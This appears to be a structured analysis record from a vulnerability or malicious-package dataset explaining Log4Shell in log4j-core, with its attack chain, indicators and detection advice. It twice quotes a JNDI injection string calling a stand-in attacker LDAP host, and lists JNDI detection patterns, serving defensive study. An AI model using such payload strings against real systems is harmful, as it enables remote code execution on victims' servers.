package_info.why_malicious: The affected versions of Apache log4j contain a critical remote code execution vulnerability (Log4Shell, CVE-2021-44228) that allows attackers to execute arbitrary code on the host system by sending specially crafted log messages. This vulnerability enables attackers to leverage JNDI lookups to load and execute malicious code from remote servers, leading to system compromise, data exfiltration, malware deployment, and widespread exploitation.

execution_context.file_location: org/apache/logging/log4j/core/lookup/JndiLookup.class within log4j-core JAR (Java classpath, typically as a Maven dependency)

malicious_snippets.code_behavior: At runtime, when a log message containing a JNDI lookup pattern (e.g., ${jndi:ldap://attacker.com/a}) is processed, the code performs a remote JNDI lookup via LDAP, retrieves and loads attacker-controlled code, resulting in remote code execution on the host system.

malice_analysis.why_suspicious: This code allows untrusted user input in log messages to trigger remote JNDI lookups, enabling attackers to load and execute arbitrary code from external servers without authentication or validation.
malice_analysis.violated_expectations: Logging frameworks are expected to treat log message content as inert data and never execute code or initiate network connections based on log content. Here, log message content directly causes network activity and code execution.
malice_analysis.similar_legitimate_use: JNDI lookups are legitimately used in enterprise Java applications for directory service integration, but should only be triggered by trusted, application-controlled input—not by untrusted log message content.
key_indicators: Presence of ${jndi:...} patterns in log messages triggering lookups
Outbound LDAP/RMI/DNS connections initiated during log processing
Dynamic class loading from remote sources as a result of log message content
Use of JndiManager.lookup or JndiLookup.lookup methods in log4j-core

attack_chain.action: Attacker sends a specially crafted log message containing a JNDI lookup string (e.g., ${jndi:ldap://attacker.com/a}) to a vulnerable application.
attack_chain.leads_to: Application processes the log message and triggers a remote JNDI lookup.

attack_chain.action: The vulnerable log4j code performs a remote lookup to the attacker's LDAP server, retrieves and loads malicious code specified by the attacker.
attack_chain.leads_to: Remote code execution on the victim system, enabling further compromise such as malware installation, data exfiltration, or lateral movement.

behavioral_signatures: Log message content containing ${jndi:ldap://...}, ${jndi:rmi://...}, or similar patterns triggers JNDI lookups
Unexpected outbound LDAP, RMI, or DNS connections from application servers during log processing
Dynamic class loading or code execution initiated as a result of log message parsing
file_indicators: Presence of log4j-core JAR versions 2.0 <= x < 2.17.0 in application dependencies
Application logs containing suspicious JNDI patterns such as ${jndi:ldap://}, ${jndi:rmi://}, or ${jndi:dns://}
network_indicators: Outbound LDAP, RMI, or DNS requests to untrusted or external servers originating from application servers
Connections to attacker-controlled infrastructure (e.g., attacker.com) immediately following log events
detection_knowledge.how_to_detect: Monitor application logs for suspicious JNDI patterns (e.g., ${jndi:ldap://}, ${jndi:rmi://}), scan application dependencies for vulnerable log4j-core versions (2.0 <= x < 2.17.0), and alert on unexpected outbound LDAP, RMI, or DNS traffic from application servers. Use software composition analysis (SCA) tools to identify and block builds or deployments containing vulnerable log4j versions. Implement network monitoring to detect and block outbound connections to untrusted LDAP/RMI/DNS endpoints.
